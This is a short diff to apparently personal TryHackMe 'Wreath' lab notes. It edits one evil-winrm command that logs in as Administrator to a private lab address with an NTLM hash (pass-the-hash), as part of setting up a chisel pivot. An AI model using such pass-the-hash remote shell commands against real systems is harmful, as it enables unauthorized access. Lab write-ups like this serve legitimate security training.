@@ -22,7 +22,7 @@ Whether you choose the recommended option or not, get a pivot up and running!
 
 1. For pivoting, we can use chisel. Run evil-winrm . #Attacking_Machine 
 ```
-evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.150 -s /home/kali/Tryhackme/Wreath
+evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.84.150 -s /home/kali/Tryhackme/Wreath/Chisel_1.7.7
 ```
 
 1. Open up a port for pivoting. #Evil-WinRM_shell 
